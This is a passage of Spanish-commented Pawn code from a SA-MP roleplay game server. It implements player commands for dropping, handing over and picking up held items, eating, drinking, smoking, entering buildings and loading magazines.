	    SendClientMessage(playerid, Blanco, string);
	    CederTiempo[playerid] = 1;
	    SetTimerEx("CederTimer", 3000, false, "i", playerid);
	    CederTiempo[playerid2] = 1;
	    SetTimerEx("CederTimer", 3000, false, "i", playerid2);
    }
    else if(strcmp(Mano,"der",true) == 0)
	{
	    if(PlayerInfo[playerid][pManoDer] <= 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
	    if(PlayerInfo[playerid2][pManoIzq] > 0 && PlayerInfo[playerid2][pManoDer] > 0){SendClientMessage(playerid, Rojo, "* Este jugador tiene ambas manos ocupadas."); return 1;}
	    new ManoDer = PlayerInfo[playerid][pManoDer], ManoDerCant = PlayerInfo[playerid][pManoDerCant];
	    if(PlayerInfo[playerid2][pManoDer] == 0)
		{
			if(ObjetoInfo[ManoDer][IDArma] > 0){GivePlayerWeapon(playerid2, ObjetoInfo[ManoDer][IDArma], ManoDerCant);}
			PlayerInfo[playerid2][pManoDer] = ManoDer, PlayerInfo[playerid2][pManoDerCant] = ManoDerCant, PonerObjeto(playerid2, 1, ManoDer), ActualizarManos(playerid2);
		}
	    else if(PlayerInfo[playerid2][pManoIzq] == 0){PlayerInfo[playerid2][pManoIzq] = ManoDer, PlayerInfo[playerid2][pManoIzqCant] = ManoDerCant, PonerObjeto(playerid2, 2, ManoDer), ActualizarManos(playerid2);}
	    PlayerInfo[playerid][pManoDer] = 0, PlayerInfo[playerid][pManoDerCant] = 0, ActualizarManos(playerid);
	    ResetPlayerWeapons(playerid);
	    format(string, sizeof(string), "* {fce80c}%s {FFFFFF}te ha dado un/a {fce80c}%s (%d){FFFFFF}.", GetPlayerNameRP(playerid), ObjetoInfo[ManoDer][NombreObjeto], ManoDerCant);
	    SendClientMessage(playerid2, Blanco, string);
	    format(string, sizeof(string), "* Has dado a {fce80c}%s {FFFFFF}un/a {fce80c}%s (%d){FFFFFF}.", GetPlayerNameRP(playerid2), ObjetoInfo[ManoDer][NombreObjeto], ManoDerCant);
	    SendClientMessage(playerid, Blanco, string);
	    CederTiempo[playerid] = 1;
	    SetTimerEx("CederTimer", 3000, false, "i", playerid);
	    CederTiempo[playerid2] = 1;
	    SetTimerEx("CederTimer", 3000, false, "i", playerid2);
    }
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/tirar",true) == 0) //Tirar objetos
{
    ActualizarManos(playerid);
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT){SendClientMessage(playerid, Rojo, "* No puedes usar este comando en esta situación."); return 1;}
    new Mano[20];
	Mano = strtok(cmdtext, idx);
	if(!strlen(Mano))
	{
		SendClientMessage(playerid, Naranja, "* /Tirar [Izq/Der]");
		SendClientMessage(playerid, Naranja, "También puedes utilizar '/Ti', '/Td' o '/Tt'.");
		return 1;
	}
	if(strcmp(Mano,"izq",true) == 0)
	{
		if(PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
		new ManoIzq = PlayerInfo[playerid][pManoIzq];
		new ManoIzqCant = PlayerInfo[playerid][pManoIzqCant];
		if(PlayerInfo[playerid][pServicioPD] > 0 && ObjetoInfo[ManoIzq][IDArma] != 0){SendClientMessage(playerid, Rojo, "* No puedes tirar armas estando de servicio."); return 1;}
		if(PlayerInfo[playerid][pServicioPD] > 0 && (ManoIzq >= 39 && ManoIzq <= 53)){SendClientMessage(playerid, Rojo, "* No puedes tirar municiones estando de servicio."); return 1;}
		format(string, sizeof(string), "* Has dejado tu {fce80c}%s (%d) {FFFFFF}en el suelo.", ObjetoInfo[ManoIzq][NombreObjeto], ManoIzqCant);
		SendClientMessage(playerid, Blanco, string);
		PlayerInfo[playerid][pManoIzq] = 0;
		PlayerInfo[playerid][pManoIzqCant] = 0;
		RemovePlayerAttachedObject(playerid, 2);
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		new World = GetPlayerVirtualWorld(playerid);
		new Interior = GetPlayerInterior(playerid);
		DropObjeto(ManoIzq, ManoIzqCant, X, Y+0.3, Z, World, Interior);
	}
	if(strcmp(Mano,"der",true) == 0)
	{
        if(PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
        new ManoDer = PlayerInfo[playerid][pManoDer];
		new ManoDerCant = PlayerInfo[playerid][pManoDerCant];
		if(PlayerInfo[playerid][pServicioPD] > 0 && ObjetoInfo[ManoDer][IDArma] != 0){SendClientMessage(playerid, Rojo, "* No puedes tirar armas estando de servicio."); return 1;}
		if(PlayerInfo[playerid][pServicioPD] > 0 && (ManoDer >= 39 && ManoDer <= 53)){SendClientMessage(playerid, Rojo, "* No puedes tirar municiones estando de servicio."); return 1;}
		format(string, sizeof(string), "* Has dejado tu {fce80c}%s (%d) {FFFFFF}en el suelo.", ObjetoInfo[ManoDer][NombreObjeto], ManoDerCant);
		SendClientMessage(playerid, Blanco, string);
		PlayerInfo[playerid][pManoDer] = 0;
		PlayerInfo[playerid][pManoDerCant] = 0;
		RemovePlayerAttachedObject(playerid, 1);
		ResetPlayerWeapons(playerid);
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		new World = GetPlayerVirtualWorld(playerid);
		new Interior = GetPlayerInterior(playerid);
		DropObjeto(ManoDer, ManoDerCant, X, Y-0.3, Z, World, Interior);
	}
	Streamer_Update(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/td",true) == 0) //Tirar objeto mano derecha
{
    ActualizarManos(playerid);
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT){SendClientMessage(playerid, Rojo, "* No puedes usar este comando en esta situación."); return 1;}
    if(PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano derecha."); return 1;}
    new ManoDer = PlayerInfo[playerid][pManoDer];
	new ManoDerCant = PlayerInfo[playerid][pManoDerCant];
	if(PlayerInfo[playerid][pServicioPD] > 0 && ObjetoInfo[ManoDer][IDArma] != 0){SendClientMessage(playerid, Rojo, "* No puedes tirar armas estando de servicio."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] > 0 && (ManoDer >= 39 && ManoDer <= 53)){SendClientMessage(playerid, Rojo, "* No puedes tirar municiones estando de servicio."); return 1;}
	format(string, sizeof(string), "* Has dejado tu {fce80c}%s (%d) {FFFFFF}en el suelo.", ObjetoInfo[ManoDer][NombreObjeto], ManoDerCant);
	SendClientMessage(playerid, Blanco, string);
	PlayerInfo[playerid][pManoDer] = 0;
	PlayerInfo[playerid][pManoDerCant] = 0;
	RemovePlayerAttachedObject(playerid, 1);
	ResetPlayerWeapons(playerid);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	new World = GetPlayerVirtualWorld(playerid);
	new Interior = GetPlayerInterior(playerid);
	DropObjeto(ManoDer, ManoDerCant, X, Y-0.3, Z, World, Interior);
    Streamer_Update(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/ti",true) == 0) //Tirar objeto mano izquierda
{
    ActualizarManos(playerid);
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT){SendClientMessage(playerid, Rojo, "* No puedes usar este comando en esta situación."); return 1;}
    if(PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en tu mano izquierda."); return 1;}
	new ManoIzq = PlayerInfo[playerid][pManoIzq];
	new ManoIzqCant = PlayerInfo[playerid][pManoIzqCant];
	if(PlayerInfo[playerid][pServicioPD] > 0 && ObjetoInfo[ManoIzq][IDArma] != 0){SendClientMessage(playerid, Rojo, "* No puedes tirar armas estando de servicio."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] > 0 && (ManoIzq >= 39 && ManoIzq <= 53)){SendClientMessage(playerid, Rojo, "* No puedes tirar municiones estando de servicio."); return 1;}
	format(string, sizeof(string), "* Has dejado tu {fce80c}%s (%d) {FFFFFF}en el suelo.", ObjetoInfo[ManoIzq][NombreObjeto], ManoIzqCant);
	SendClientMessage(playerid, Blanco, string);
	PlayerInfo[playerid][pManoIzq] = 0;
	PlayerInfo[playerid][pManoIzqCant] = 0;
	RemovePlayerAttachedObject(playerid, 2);
	new Float:X, Float:Y, Float:Z;
	GetPlayerPos(playerid, X, Y, Z);
	new World = GetPlayerVirtualWorld(playerid);
	new Interior = GetPlayerInterior(playerid);
	DropObjeto(ManoIzq, ManoIzqCant, X, Y+0.3, Z, World, Interior);
    Streamer_Update(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/tt",true) == 0) //Tirar objeto de cada mano
{
    ActualizarManos(playerid);
    if(GetPlayerState(playerid) != PLAYER_STATE_ONFOOT){SendClientMessage(playerid, Rojo, "* No puedes usar este comando en esta situación."); return 1;}
    if(PlayerInfo[playerid][pManoIzq] == 0 && PlayerInfo[playerid][pManoDer] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en ninguna mano."); return 1;}
    new ManoIzq, ManoIzqCant, ManoDer, ManoDerCant;
	if(PlayerInfo[playerid][pManoIzq] > 0){ManoIzq = PlayerInfo[playerid][pManoIzq]; ManoIzqCant = PlayerInfo[playerid][pManoIzqCant];}
	if(PlayerInfo[playerid][pManoDer] > 0){ManoDer = PlayerInfo[playerid][pManoDer]; ManoDerCant = PlayerInfo[playerid][pManoDerCant];}
	if(PlayerInfo[playerid][pServicioPD] > 0 && (ObjetoInfo[ManoDer][IDArma] != 0 || ObjetoInfo[ManoIzq][IDArma] != 0)){SendClientMessage(playerid, Rojo, "* No puedes tirar armas estando de servicio."); return 1;}
	if(PlayerInfo[playerid][pServicioPD] > 0 && ((ManoIzq >= 39 && ManoIzq <= 53) || (ManoDer >= 39 && ManoDer <= 53))){SendClientMessage(playerid, Rojo, "* No puedes tirar municiones estando de servicio."); return 1;}
    if(ManoIzq > 0)
	{
		format(string, sizeof(string), "* Has dejado tu {fce80c}%s (%d) {FFFFFF}en el suelo.", ObjetoInfo[ManoIzq][NombreObjeto], ManoIzqCant);
		SendClientMessage(playerid, Blanco, string);
		PlayerInfo[playerid][pManoIzq] = 0;
		PlayerInfo[playerid][pManoIzqCant] = 0;
		RemovePlayerAttachedObject(playerid, 2);
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		new World = GetPlayerVirtualWorld(playerid);
		new Interior = GetPlayerInterior(playerid);
		DropObjeto(ManoIzq, ManoIzqCant, X, Y+0.3, Z, World, Interior);
	}
	if(ManoDer > 0)
	{
		format(string, sizeof(string), "* Has dejado tu {fce80c}%s (%d) {FFFFFF}en el suelo.", ObjetoInfo[ManoDer][NombreObjeto], ManoDerCant);
		SendClientMessage(playerid, Blanco, string);
		PlayerInfo[playerid][pManoDer] = 0;
		PlayerInfo[playerid][pManoDerCant] = 0;
		RemovePlayerAttachedObject(playerid, 1);
		ResetPlayerWeapons(playerid);
		new Float:X, Float:Y, Float:Z;
		GetPlayerPos(playerid, X, Y, Z);
		new World = GetPlayerVirtualWorld(playerid);
		new Interior = GetPlayerInterior(playerid);
		DropObjeto(ManoDer, ManoDerCant, X, Y-0.3, Z, World, Interior);
	}
	Streamer_Update(playerid);
    return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/coger",true) == 0) //Recoger objeto del suelo
{
	RecogerObjeto(playerid);
	return 1;
}


//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/espalda",true) == 0) //Poner objeto en la espalda
{
	if(PlayerInfo[playerid][pEspalda] > 0){SendClientMessage(playerid, Rojo, "* Ya tienes un objeto colgado en tu espalda."); return 1;}
	if(PlayerInfo[playerid][pManoDer] == 0 && PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en ninguna mano."); return 1;}
	if(PlayerInfo[playerid][pManoDer] > 0 && ObjetoInfo[PlayerInfo[playerid][pManoDer]][Guardable] == 0)
	{
	    ActualizarManos(playerid);
		new Mano = PlayerInfo[playerid][pManoDer];
		format(string, sizeof(string), "* Cuelgas un/a {fce80c}%s (%d) {FFFFFF}en tu espalda.", ObjetoInfo[Mano][NombreObjeto], PlayerInfo[playerid][pManoDerCant]);
  		SendClientMessage(playerid, Blanco, string);
  		SendClientMessage(playerid, Blanco, "Utiliza /QEspalda para quitarte el objeto de la espalda.");
		PlayerInfo[playerid][pEspalda] = PlayerInfo[playerid][pManoDer], PlayerInfo[playerid][pEspaldaCant] = PlayerInfo[playerid][pManoDerCant];
		PlayerInfo[playerid][pManoDer] = 0, PlayerInfo[playerid][pManoDerCant] = 0;
		PonerObjeto(playerid, 3, Mano);
		RemovePlayerWeapon(playerid, ObjetoInfo[Mano][IDArma]);
		RemovePlayerAttachedObject(playerid, 1);
	}
	else if(PlayerInfo[playerid][pManoIzq] > 0 && ObjetoInfo[PlayerInfo[playerid][pManoIzq]][Guardable] == 0)
	{
	    ActualizarManos(playerid);
		new Mano = PlayerInfo[playerid][pManoIzq];
		format(string, sizeof(string), "* Cuelgas un/a {fce80c}%s (%d) {FFFFFF}en tu espalda.", ObjetoInfo[Mano][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
        SendClientMessage(playerid, Blanco, string);
        SendClientMessage(playerid, Blanco, "Utiliza /QEspalda para quitarte el objeto de la espalda.");
		PlayerInfo[playerid][pEspalda] = PlayerInfo[playerid][pManoIzq], PlayerInfo[playerid][pEspaldaCant] = PlayerInfo[playerid][pManoIzqCant];
		PlayerInfo[playerid][pManoIzq] = 0, PlayerInfo[playerid][pManoIzqCant] = 0;
		PonerObjeto(playerid, 3, Mano);
		RemovePlayerAttachedObject(playerid, 2);
	}
	else{SendClientMessage(playerid, Rojo, "* No llevas ningún objeto que se pueda colgar de la espalda.");}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/qespalda",true) == 0) //Quitar objeto de la espalda
{
	if(PlayerInfo[playerid][pEspalda] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada colgado en tu espalda."); return 1;}
    if(PlayerInfo[playerid][pManoDer] > 0 && PlayerInfo[playerid][pManoIzq] > 0){SendClientMessage(playerid, Rojo, "* Tienes ambas manos ocupadas."); return 1;}
	new Espalda = PlayerInfo[playerid][pEspalda];
	if(PlayerInfo[playerid][pManoDer] == 0)
	{
		format(string, sizeof(string), "* Descuelgas un/a {fce80c}%s (%d) {FFFFFF}con tu mano derecha.", ObjetoInfo[Espalda][NombreObjeto], PlayerInfo[playerid][pEspaldaCant]);
  		SendClientMessage(playerid, Blanco, string);
		GivePlayerWeapon(playerid, ObjetoInfo[Espalda][IDArma], PlayerInfo[playerid][pEspaldaCant]);
		PlayerInfo[playerid][pManoDer] = PlayerInfo[playerid][pEspalda];
		PlayerInfo[playerid][pManoDerCant] = PlayerInfo[playerid][pEspaldaCant];
		PonerObjeto(playerid, 1, Espalda);
	}
	else if(PlayerInfo[playerid][pManoIzq] == 0)
	{
		format(string, sizeof(string), "* Descuelgas un/a {fce80c}%s (%d) {FFFFFF}con tu mano izquierda.", ObjetoInfo[Espalda][NombreObjeto], PlayerInfo[playerid][pEspaldaCant]);
  		SendClientMessage(playerid, Blanco, string);
		PlayerInfo[playerid][pManoIzq] = PlayerInfo[playerid][pEspalda];
		PlayerInfo[playerid][pManoIzqCant] = PlayerInfo[playerid][pEspaldaCant];
		PonerObjeto(playerid, 2, Espalda);
	}
	PlayerInfo[playerid][pEspalda] = 0, PlayerInfo[playerid][pEspaldaCant] = 0;
	RemovePlayerAttachedObject(playerid, 3);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/comer",true) == 0) //Comer
{
    if(PlayerInfo[playerid][pManoDer] == 0 && PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en ninguna mano."); return 1;}
    if(((PlayerInfo[playerid][pManoDer] >= 55 && PlayerInfo[playerid][pManoDer] <= 57) || (PlayerInfo[playerid][pManoDer] >= 65 && PlayerInfo[playerid][pManoDer] <= 67)) && PlayerInfo[playerid][pManoDerCant] > 0)
    {
        switch(PlayerInfo[playerid][pManoDer])
        {
	        case 55: PlayerInfo[playerid][pHambre] += 15; //Bolsa de doritos
	        case 56: PlayerInfo[playerid][pHambre] += 15; //Bolsa de patatas
	        case 57: PlayerInfo[playerid][pHambre] += 15; //Bolsa de nachos
	        case 65: PlayerInfo[playerid][pHambre] += 20; //Hamburguesa
	        case 66: PlayerInfo[playerid][pHambre] += 20; //Burrito
	        case 67: PlayerInfo[playerid][pHambre] += 20; //Pizza
        }
        format(string, sizeof(string), "* %s come de su %s.", GetPlayerNameRP(playerid), ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto]);
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
        PlayerInfo[playerid][pManoDerCant] --;
        if(PlayerInfo[playerid][pHambre] > MAX_HAMBRE){PlayerInfo[playerid][pHambre] = MAX_HAMBRE;}
        ActualizarHambre(playerid);
        new Float:cvida;
        GetPlayerHealth(playerid, cvida);
        if(cvida < 100) GivePlayerHealth(playerid, 1);
	    return 1;
    }
    else if(((PlayerInfo[playerid][pManoIzq] >= 55 && PlayerInfo[playerid][pManoIzq] <= 57) || (PlayerInfo[playerid][pManoIzq] >= 65 && PlayerInfo[playerid][pManoIzq] <= 67)) && PlayerInfo[playerid][pManoIzqCant] > 0)
    {
        switch(PlayerInfo[playerid][pManoIzq])
        {
	        case 55: PlayerInfo[playerid][pHambre] += 15; //Bolsa de doritos
	        case 56: PlayerInfo[playerid][pHambre] += 15; //Bolsa de patatas
	        case 57: PlayerInfo[playerid][pHambre] += 15; //Bolsa de nachos
	        case 65: PlayerInfo[playerid][pHambre] += 20; //Hamburguesa
	        case 66: PlayerInfo[playerid][pHambre] += 20; //Burrito
	        case 67: PlayerInfo[playerid][pHambre] += 20; //Pizza
        }
        format(string, sizeof(string), "* %s come de su %s.", GetPlayerNameRP(playerid), ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto]);
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
        PlayerInfo[playerid][pManoIzqCant] --;
        if(PlayerInfo[playerid][pHambre] > MAX_HAMBRE){PlayerInfo[playerid][pHambre] = MAX_HAMBRE;}
        ActualizarHambre(playerid);
        new Float:cvida;
        GetPlayerHealth(playerid, cvida);
        if(cvida < 100) GivePlayerHealth(playerid, 1);
	    return 1;
    }
    else{SendClientMessage(playerid, Rojo, "* No tienes ningún tipo de comida en ninguna mano o no te queda.");}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/beber",true) == 0) //Beber
{
    if(PlayerInfo[playerid][pManoDer] == 0 && PlayerInfo[playerid][pManoIzq] == 0){SendClientMessage(playerid, Rojo, "* No tienes nada en ninguna mano."); return 1;}
    if(((PlayerInfo[playerid][pManoDer] >= 58 && PlayerInfo[playerid][pManoDer] <= 64) || (PlayerInfo[playerid][pManoDer] >= 71 && PlayerInfo[playerid][pManoDer] <= 73)) && PlayerInfo[playerid][pManoDerCant] > 0)
    {
        switch(PlayerInfo[playerid][pManoDer])
        {
	        case 58: PlayerInfo[playerid][pSed] += 12; //Lata de sprunk
	        case 59: PlayerInfo[playerid][pSed] += 12; //Lata de fanta
	        case 60: PlayerInfo[playerid][pSed] += 14; //Botella de agua
	        case 61: PlayerInfo[playerid][pSed] += 11; //Botella de cerveza
	        case 62: PlayerInfo[playerid][pSed] += 11; //Copa de vino
	        case 63: PlayerInfo[playerid][pSed] += 11; //Vaso de whisky
	        case 64: PlayerInfo[playerid][pSed] += 11; //Vaso de ron
	        case 71: PlayerInfo[playerid][pSed] += 11; //Botella de ron
	        case 72: PlayerInfo[playerid][pSed] += 11; //Botella de whisky
	        case 73: PlayerInfo[playerid][pSed] += 11; //Botella de vino
        }
        format(string, sizeof(string), "* %s bebe de su %s.", GetPlayerNameRP(playerid), ObjetoInfo[PlayerInfo[playerid][pManoDer]][NombreObjeto]);
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
        PlayerInfo[playerid][pManoDerCant] --;
        if(PlayerInfo[playerid][pSed] > MAX_SED){PlayerInfo[playerid][pSed] = MAX_SED;}
        ActualizarSed(playerid);
        new Float:cvida;
        GetPlayerHealth(playerid, cvida);
        if(cvida < 100) GivePlayerHealth(playerid, 1);
	    return 1;
    }
    else if(((PlayerInfo[playerid][pManoIzq] >= 58 && PlayerInfo[playerid][pManoIzq] <= 64) || (PlayerInfo[playerid][pManoIzq] >= 71 && PlayerInfo[playerid][pManoIzq] <= 73)) && PlayerInfo[playerid][pManoIzqCant] > 0)
    {
        switch(PlayerInfo[playerid][pManoIzq])
        {
	        case 58: PlayerInfo[playerid][pSed] += 12; //Lata de sprunk
	        case 59: PlayerInfo[playerid][pSed] += 12; //Lata de fanta
	        case 60: PlayerInfo[playerid][pSed] += 14; //Botella de agua
	        case 61: PlayerInfo[playerid][pSed] += 11; //Botella de cerveza
	        case 62: PlayerInfo[playerid][pSed] += 11; //Copa de vino
	        case 63: PlayerInfo[playerid][pSed] += 11; //Vaso de whisky
	        case 64: PlayerInfo[playerid][pSed] += 11; //Vaso de ron
	        case 71: PlayerInfo[playerid][pSed] += 11; //Botella de ron
	        case 72: PlayerInfo[playerid][pSed] += 11; //Botella de whisky
	        case 73: PlayerInfo[playerid][pSed] += 11; //Botella de vino
        }
        format(string, sizeof(string), "* %s bebe de su %s.", GetPlayerNameRP(playerid), ObjetoInfo[PlayerInfo[playerid][pManoIzq]][NombreObjeto]);
 	    ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
        PlayerInfo[playerid][pManoIzqCant] --;
        if(PlayerInfo[playerid][pSed] > MAX_SED){PlayerInfo[playerid][pSed] = MAX_SED;}
        ActualizarSed(playerid);
        new Float:cvida;
        GetPlayerHealth(playerid, cvida);
        if(cvida < 100) GivePlayerHealth(playerid, 1);
	    return 1;
    }
    else{SendClientMessage(playerid, Rojo, "* No tienes ningún tipo de bebida en ninguna mano o no te queda.");}
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/fumar",true) == 0) //Fumar
{
	if(!((PlayerInfo[playerid][pManoDer] == 69 && PlayerInfo[playerid][pManoDerCant] > 0 && PlayerInfo[playerid][pManoIzq] == 70 && PlayerInfo[playerid][pManoIzqCant] > 0) || (PlayerInfo[playerid][pManoDer] == 70 && PlayerInfo[playerid][pManoDerCant] > 0 && PlayerInfo[playerid][pManoIzq] == 69 && PlayerInfo[playerid][pManoIzqCant] > 0)))
	{
		SendClientMessage(playerid, Rojo, "* Debes tener un mechero con gas en una mano y una caja de cigarrillos en la otra.");
		return 1;
	}
	PlayerInfo[playerid][pManoDerCant] --;
	PlayerInfo[playerid][pManoIzqCant] --;
	ApplyAnimation(playerid, "GANGS", "smkcig_prtl_F", 3.0, 0, 0, 0, 0, 0);
	SetPlayerSpecialAction(playerid, SPECIAL_ACTION_SMOKE_CIGGY);
	format(string, sizeof(string), "* %s enciende un cigarrillo.", GetPlayerNameRP(playerid));
 	ProxDetector(15.0, playerid, string,Morado,Morado,Morado,Morado,Morado);
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/entrada",true) == 0) //Entrar/salir
{
    if(GetPlayerState(playerid) != 1){return 1;}
	if(GetPlayerFueraPuertaCasa(playerid)) //Está en la entrada de una casa
	{
		new h = GetPlayerFueraPuertaCasa(playerid);
		if(HouseInfo[h][hCerrada] == 1){GameTextForPlayer(playerid, "~r~Cerrado", 5000, 1);}
		else
		{
		    TogglePlayerControllable(playerid, 0);
		    SetTimerEx("Descongelar", 2000, false, "i", playerid);
		    SetPlayerPos(playerid, HouseInfo[h][hSalidaX], HouseInfo[h][hSalidaY], HouseInfo[h][hSalidaZ]);
		    SetPlayerInterior(playerid, HouseInfo[h][hInterior]);
		    SetPlayerVirtualWorld(playerid, HouseInfo[h][hVirtualWorld]);
		    return 1;
		}
	}
	if(GetPlayerDentroPuertaCasa(playerid)) //Está en la salida de una casa
	{
	    new h = GetPlayerDentroPuertaCasa(playerid);
	    if(HouseInfo[h][hInterior2] != 0) //Si el mundo exterior no es 0 congelar y descongelar
	    {
	        TogglePlayerControllable(playerid, 0);
		    SetTimerEx("Descongelar", 2000, false, "i", playerid);
	    }
	    SetPlayerPos(playerid, HouseInfo[h][hEntradaX], HouseInfo[h][hEntradaY], HouseInfo[h][hEntradaZ]);
	    SetPlayerInterior(playerid, HouseInfo[h][hInterior2]);
	    SetPlayerVirtualWorld(playerid, HouseInfo[h][hVirtualWorld2]);
	    return 1;
	}
	if(GetPlayerFueraPuertaNego(playerid)) //Está en la entrada de un negocio
	{
		new n = GetPlayerFueraPuertaNego(playerid);
		if(NegoInfo[n][nCerrado] == 1){GameTextForPlayer(playerid, "~r~Cerrado", 5000, 1);}
		else
		{
		    TogglePlayerControllable(playerid, 0);
		    SetTimerEx("Descongelar", 2000, false, "i", playerid);
		    SetPlayerPos(playerid, NegoInfo[n][nSalidaX], NegoInfo[n][nSalidaY], NegoInfo[n][nSalidaZ]);
		    SetPlayerInterior(playerid, NegoInfo[n][nInterior]);
		    SetPlayerVirtualWorld(playerid, NegoInfo[n][nVirtualWorld]);
		    return 1;
		}
	}
	if(GetPlayerDentroPuertaNego(playerid)) //Está en la salida de un negocio
	{
	    new n = GetPlayerDentroPuertaNego(playerid);
	    if(NegoInfo[n][nInterior2] != 0) //Si el mundo exterior no es 0 congelar y descongelar
	    {
	        TogglePlayerControllable(playerid, 0);
		    SetTimerEx("Descongelar", 2000, false, "i", playerid);
	    }
	    SetPlayerPos(playerid, NegoInfo[n][nEntradaX], NegoInfo[n][nEntradaY], NegoInfo[n][nEntradaZ]);
	    SetPlayerInterior(playerid, NegoInfo[n][nInterior2]);
	    SetPlayerVirtualWorld(playerid, NegoInfo[n][nVirtualWorld2]);
	    return 1;
	}
	EntrarSitioPublico(playerid); //Entrar a establecimiento
	return 1;
}

//---------------------------------------------------------------------------------------------------------------

if(strcmp(cmd,"/cargador",true) == 0) //Comando de cargadores
{
	if(!GetPlayerCargadorCalibre(playerid, 1) && !GetPlayerCargadorCalibre(playerid, 2)){SendClientMessage(playerid, Rojo, "* No tienes un cargador en ninguna mano."); return 1;}
	new opcion[25];
	opcion = strtok(cmdtext, idx);
	if(!strlen(opcion))
	{
		SendClientMessage(playerid, Naranja, "* /Cargador [Opción] ");
		SendClientMessage(playerid, Naranja, "Llenar, Vaciar");
		return 1;
	}
	if(strcmp(opcion,"llenar",true) == 0)
	{
	    if(!GetPlayerMunicionCalibre(playerid, 1) && !GetPlayerMunicionCalibre(playerid, 2)){SendClientMessage(playerid, Rojo, "* No tienes ningún tipo de munición en ninguna mano."); return 1;}
	    new ManoDer = PlayerInfo[playerid][pManoDer], ManoIzq = PlayerInfo[playerid][pManoIzq];
	    if(GetPlayerMunicionCalibre(playerid, 1) && GetPlayerCargadorCalibre(playerid, 2) && GetPlayerMunicionCalibre(playerid, 1) == GetPlayerCargadorCalibre(playerid, 2)) //Tiene munición en mano derecha y cargador en mano izquierda
	    {
	        tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Cargador Llenar [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(PlayerInfo[playerid][pManoIzqCant] >= ObjetoInfo[ManoIzq][Capacidad]){SendClientMessage(playerid, Rojo, "* El cargador ya está a su máxima capacidad."); return 1;}
			if(cantidad < 1){SendClientMessage(playerid, Rojo, "* La cantidad no puede ser nula o negativa."); return 1;}
			if(cantidad > PlayerInfo[playerid][pManoDerCant]){SendClientMessage(playerid, Rojo, "* No te queda tanta munición en la caja."); return 1;}
			if(PlayerInfo[playerid][pManoIzqCant] + cantidad >= ObjetoInfo[ManoIzq][Capacidad]) //Si la cantidad + el cargador es mayor a su capacidad
			{
			    format(string, sizeof(string), "* Has rellenado tu {fce80c}%s{FFFFFF} con {fce80c}%d %s{FFFFFF}.", ObjetoInfo[ManoIzq][NombreObjeto], ObjetoInfo[ManoIzq][Capacidad] - PlayerInfo[playerid][pManoIzqCant], ObjetoInfo[ManoDer][NombreObjeto]);
				SendClientMessage(playerid, Blanco, string);
				PlayerInfo[playerid][pManoDerCant] -= ObjetoInfo[ManoIzq][Capacidad] - PlayerInfo[playerid][pManoIzqCant];
			    PlayerInfo[playerid][pManoIzqCant] = ObjetoInfo[ManoIzq][Capacidad];
				return 1;
			}
			PlayerInfo[playerid][pManoDerCant] -= cantidad;
			PlayerInfo[playerid][pManoIzqCant] += cantidad;
			format(string, sizeof(string), "* Has metido {fce80c}%d %s {FFFFFF}en tu {fce80c}%s (%d){FFFFFF}.", cantidad, ObjetoInfo[ManoDer][NombreObjeto], ObjetoInfo[ManoIzq][NombreObjeto], PlayerInfo[playerid][pManoIzqCant]);
			SendClientMessage(playerid, Blanco, string);
	    }
	    else if(GetPlayerMunicionCalibre(playerid, 2) && GetPlayerCargadorCalibre(playerid, 1) && GetPlayerMunicionCalibre(playerid, 2) == GetPlayerCargadorCalibre(playerid, 1))  //Tiene munición en mano izquierda y cargador en mano derecha
	    {
	        tmp = strtok(cmdtext, idx);
			if(!strlen(tmp))
			{
				SendClientMessage(playerid, Naranja, "* /Cargador Llenar [Cantidad]");
				return 1;
			}
			new cantidad = strval(tmp);
			if(PlayerInfo[playerid][pManoDerCant] >= ObjetoInfo[ManoDer][Capacidad]){SendClientMessage(playerid, Rojo, "* El cargador ya está a su máxima capacidad."); return 1;}
